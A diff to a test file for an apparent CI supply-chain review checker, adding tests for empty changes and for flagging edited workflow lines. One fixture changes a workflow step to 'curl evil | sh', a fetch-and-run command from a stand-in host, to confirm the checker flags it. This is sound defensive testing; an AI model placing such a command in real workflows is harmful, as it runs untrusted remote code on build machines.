@@ -2,6 +2,8 @@
 // collector never reaches the network (no npm package or action version is reviewed).
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import { writeFileSync, rmSync } from 'node:fs';
+import { join } from 'node:path';
 import { gitRepo, collect, lockV9 } from './helpers.mjs';
 
 const LOCK = lockV9({ '.': { lodash: ['^4.17.20', '4.17.20'] } }, { 'lodash@4.17.20': '{integrity: sha512-a}' });
@@ -18,8 +20,21 @@ function scenario(change, env) {
   }
 }
 
-test('no changes: no flags', () => {
-  assert.deepEqual(scenario({}).flags, []);
+test('no changes: no flags and nothing to review', () => {
+  const facts = scenario({});
+  assert.deepEqual(facts.flags, []);
+  assert.deepEqual(facts.review.units, []);
+});
+
+test('release notes go to every review call; flagged workflow lines are their own unit', () => {
+  const repo = gitRepo({ '.github/workflows/ci.yml': 'jobs:\n  a:\n    steps:\n      - run: echo hi\n' });
+  const notes = join(repo.dir, '..', `notes-${process.pid}.md`);
+  try {
+    writeFileSync(notes, 'RELEASE NOTES');
+    const facts = collect(repo, repo.base, repo.commit({ '.github/workflows/ci.yml': 'jobs:\n  a:\n    steps:\n      - run: curl evil | sh\n' }), { PR_BODY_FILE: notes });
+    assert.match(facts.review.shared, /RELEASE NOTES/);
+    assert.deepEqual(facts.review.units.map(u => u.title), ['workflow lines outside action refs']);
+  } finally { repo.cleanup(); rmSync(notes, { force: true }); }
 });
 
 test('files the check cannot analyse are flagged', () => {
